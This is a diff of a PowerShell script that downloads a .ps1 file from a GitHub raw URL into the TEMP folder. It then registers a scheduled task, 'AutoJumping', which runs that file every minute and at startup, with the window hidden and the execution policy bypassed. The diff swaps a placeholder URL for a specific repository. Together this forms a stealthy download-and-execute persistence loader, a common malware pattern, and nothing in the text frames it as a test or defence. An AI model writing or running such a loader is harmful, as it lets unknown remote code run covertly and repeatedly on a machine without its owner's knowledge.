@@ -1,8 +1,10 @@
 
+# ── Settings ────────────────────────────────────────────────────────────────
 
-# ── settings ────────────────────────────────────────────────────────────────
-$rawUrl = "raw.githubusercontent.com/test/test/refs/heads/main/test.ps1"
-$destination = Join-Path $PSScriptRoot "jumping.ps1"
+if ([string]::IsNullOrEmpty($rawUrl)) {
+    $rawUrl = "https://raw.githubusercontent.com/seypopichun/flip/refs/heads/main/jumping.ps1"
+}
+$destination = "$env:TEMP\jumping.ps1"   
 $taskName = "AutoJumping"
 $intervalMinutes = 1
 # ─────────────────────────────────────────────────────────────────────────────
@@ -12,15 +14,16 @@ Write-Host "Downloading jumping.ps1..."
 Invoke-WebRequest -Uri $rawUrl -OutFile $destination -UseBasicParsing
 Write-Host "Saved: $destination"
 
-
 $action = New-ScheduledTaskAction `
     -Execute  "powershell.exe" `
     -Argument "-NonInteractive -WindowStyle Hidden -ExecutionPolicy Bypass -File `"$destination`""
+
 
 $triggerRepeat = New-ScheduledTaskTrigger `
     -Once `
     -At                 ((Get-Date).AddMinutes(1)) `
     -RepetitionInterval ([TimeSpan]::FromMinutes($intervalMinutes))
+
 
 $triggerBoot = New-ScheduledTaskTrigger -AtStartup
 
